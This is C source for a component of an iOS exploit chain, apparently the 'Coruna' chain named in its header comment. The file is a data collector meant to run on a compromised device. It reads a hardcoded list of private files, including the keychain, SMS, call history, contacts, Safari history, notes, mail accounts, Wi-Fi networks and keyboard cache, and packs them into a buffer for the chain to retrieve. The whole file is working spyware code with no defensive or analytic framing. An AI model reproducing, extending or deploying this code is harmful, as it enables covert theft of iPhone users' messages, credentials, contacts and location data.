// collector_v2.c - Multi-file collector for Coruna exploit chain
// Reads accessible iOS system files, returns status + data
extern int open(const char *path, int oflag, ...);
extern long long read(int fd, void *buf, long long count);
extern int close(int fd);

#define O_RDONLY 0

static volatile int _data_marker = 0xDEADBEEF;
static unsigned char _result_buf[65536];
static int _result_len = 0;

struct target { const char *path; int maxr; };

// Accessible targets: system files + unprotected prefs
static const struct target _targets[] = {
    // System files (world-readable)
    { "/etc/hosts", 2048 },
    { "/etc/fstab", 1024 },
    { "/etc/master.passwd", 1024 },
    { "/var/db/timezone/zoneinfo/America/New_York", 4096 },
    // Preferences (some accessible after first unlock)
    { "/var/mobile/Library/Preferences/.GlobalPreferences.plist", 2048 },
    { "/var/mobile/Library/Preferences/com.apple.springboard.plist", 2048 },
    { "/var/mobile/Library/Preferences/com.apple.preferences.plist", 2048 },
    { "/var/mobile/Library/Preferences/com.apple.mobilephone.plist", 2048 },
    { "/var/mobile/Library/Preferences/com.apple Maps.plist", 1024 },
    // System databases
    { "/var/mobile/Library/Keyboard/dynamic-text.dat", 4096 },
    { "/var/mobile/Library/Caches/locationd/clients.plist", 2048 },
    { "/var/mobile/Library/Preferences/com.apple.account.settings.plist", 2048 },
    // Network
    { "/var/mobile/Library/Preferences/com.apple.wifi.plist", 2048 },
    { "/var/mobile/Library/Preferences/com.apple.network.identification.plist", 2048 },
    // Carrier
    { "/var/mobile/Library/Preferences/com.apple.carrier.plist", 1024 },
    // AddressBook attempt
    { "/var/mobile/Library/AddressBook/AddressBook.sqlitedb", 8192 },
    { "/var/mobile/Library/AddressBook/AddressBook.sqlitedb-wal", 8192 },
    // SMS attempt
    { "/var/mobile/Library/SMS/sms.db", 8192 },
    { "/var/mobile/Library/SMS/sms.db-wal", 8192 },
    // Safari
    { "/var/mobile/Library/Safari/History.db", 8192 },
    // WiFi
    { "/var/mobile/Library/WiFi/com.apple.wifi.known-networks.plist", 4096 },
    // Call history
    { "/var/mobile/Library/CallHistoryDB/CallHistory.storedata", 8192 },
    // Keychain
    { "/var/Keychains/keychain-2.db", 8192 },
    // Notes
    { "/var/mobile/Library/Notes/notes.sqlite", 8192 },
    // Calendar
    { "/var/mobile/Library/Calendar/Calendar.sqlitedb", 8192 },
    // Mail
    { "/var/mobile/Library/Mail/Accounts.plist", 2048 },
    // Installed apps list
    { "/var/mobile/Library/MobileInstallation/LastLaunchServices.plist", 4096 },
};

#define N_T (sizeof(_targets)/sizeof(_targets[0]))

int process(void *arg) {
    int pos = 4, ok = 0, i;
    for (i = 0; i < 65536; i++) _result_buf[i] = 0;
    
    for (i = 0; i < (int)N_T; i++) {
        if (pos + 8 >= 65520) break;
        int fd = open(_targets[i].path, O_RDONLY);
        if (fd < 0) {
            // status=0xFFFFFFFF, len=0
            _result_buf[pos]=0xFF; _result_buf[pos+1]=0xFF;
            _result_buf[pos+2]=0xFF; _result_buf[pos+3]=0xFF;
            _result_buf[pos+4]=0; _result_buf[pos+5]=0;
            _result_buf[pos+6]=0; _result_buf[pos+7]=0;
            pos += 8;
            continue;
        }
        int room = 65520 - pos - 8;
        int maxr = _targets[i].maxr < room ? _targets[i].maxr : room;
        long long n = read(fd, _result_buf + pos + 8, maxr);
        close(fd);
        if (n > 0) {
            int nb = (int)n;
            // status = byte count
            _result_buf[pos]=(nb>>24)&0xFF; _result_buf[pos+1]=(nb>>16)&0xFF;
            _result_buf[pos+2]=(nb>>8)&0xFF; _result_buf[pos+3]=nb&0xFF;
            // len
            _result_buf[pos+4]=(nb>>24)&0xFF; _result_buf[pos+5]=(nb>>16)&0xFF;
            _result_buf[pos+6]=(nb>>8)&0xFF; _result_buf[pos+7]=nb&0xFF;
            pos += 8 + nb;
            ok++;
        } else {
            _result_buf[pos]=0xFF; _result_buf[pos+1]=0xFF;
            _result_buf[pos+2]=0xFF; _result_buf[pos+3]=0xFE;
            _result_buf[pos+4]=0; _result_buf[pos+5]=0;
            _result_buf[pos+6]=0; _result_buf[pos+7]=0;
            pos += 8;
        }
    }
    _result_buf[0]=(ok>>24)&0xFF; _result_buf[1]=(ok>>16)&0xFF;
    _result_buf[2]=(ok>>8)&0xFF; _result_buf[3]=ok&0xFF;
    _result_len = pos;
    return (ok << 16) | (pos & 0xFFFF);
}